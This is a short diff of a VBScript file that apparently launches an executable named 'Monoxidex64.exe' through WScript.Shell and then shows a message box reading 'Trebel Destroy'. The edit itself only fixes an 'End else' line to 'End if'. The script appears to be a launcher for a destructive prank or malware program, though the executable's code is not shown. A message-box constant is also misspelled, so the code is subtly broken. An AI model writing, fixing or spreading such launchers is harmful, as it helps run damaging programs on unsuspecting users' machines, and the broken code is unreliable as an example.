@@ -7,4 +7,4 @@ set WshShell = WScript.CreateObject ("Wscript.Shell")
 WshShell.run ("Monoxidex64.exe")
 msgbox"Trebel Destroy",vbAboutRetryIgnone+16,"Trebel Destroy"
   else
-End else
+End if
